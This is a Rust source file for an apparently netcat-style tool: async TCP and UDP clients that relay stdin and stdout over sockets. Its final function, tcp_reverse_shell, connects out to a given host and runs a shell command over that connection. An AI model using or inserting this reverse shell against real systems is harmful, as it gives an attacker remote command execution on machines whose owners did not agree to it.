use std::io;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

use crate::common::read_write_exec;

/// Client that connect to a TCP server and stream data
/// from stdin to the server and from the server to stdout
pub async fn tcp_client(addr: &str, port: u16) -> io::Result<()> {
    let stream = tokio::net::TcpStream::connect((addr, port)).await?;
    // Get reader and writer from the stream
    let (mut reader, mut writer) = stream.into_split();
    let mut stdin = tokio::io::stdin();
    let mut stdout = tokio::io::stdout();

    // Stream data from the server stream to stdout
    let client_reader = tokio::spawn(async move {
        tokio::io::copy(&mut reader, &mut stdout).await.unwrap();
    });

    // Stream data from stdin to the server stream
    let client_writer = tokio::spawn(async move {
        tokio::io::copy(&mut stdin, &mut writer).await.unwrap();
    });

    tokio::select! {
        _ = client_reader => { eprintln!("Connection closed"); }
        _ = client_writer => { eprintln!("Connection closed"); }
    }

    Ok(())
}

/// Client that connect to a UDP server and stream data
/// from stdin to the server and from the server to stdout
/// This function uses UDP instead of TCP
pub async fn udp_client(addr: &str, port: u16) -> io::Result<()> {
    // Bind to a return port. specify 0 to let the OS choose a port
    let socket = tokio::net::UdpSocket::bind((addr, 0)).await?;
    socket.connect((addr, port)).await?;

    let mut stdin_buf = vec![0u8; 1024];
    let mut recv_buf = vec![0u8; 1024];

    let mut stdin = tokio::io::stdin();
    let mut stdout = tokio::io::stdout();

    loop {
        tokio::select! (
            res = stdin.read(&mut stdin_buf) => {
                match res {
                    Ok(nbytes) => {
                        if nbytes == 0 {
                            break;
                        }
                        let _ = socket.send(&stdin_buf[..nbytes]).await?;
                    }
                    Err(e) => {
                        return Err(io::Error::new(io::ErrorKind::Other, e));
                    }
                }
            }
            res = socket.recv(&mut recv_buf) => {
                match res {
                    Ok(nbytes) => {
                        let _ = stdout.write(&recv_buf[..nbytes]).await?;
                    }
                    Err(e) => {
                        return Err(io::Error::new(io::ErrorKind::Other, e));
                    }
                }
            }
        )
    }
    Ok(())
}

/// Reverse shell client that connects to a TCP server and exec a shell command
pub async fn tcp_reverse_shell(addr: &str, port: u16, cmd: &str) -> io::Result<()> {
    let stream = tokio::net::TcpStream::connect((addr, port)).await?;
    // Get reader and writer from the stream
    let (reader, writer) = stream.into_split();
    read_write_exec(reader, writer, cmd).await?;
    Ok(())
}
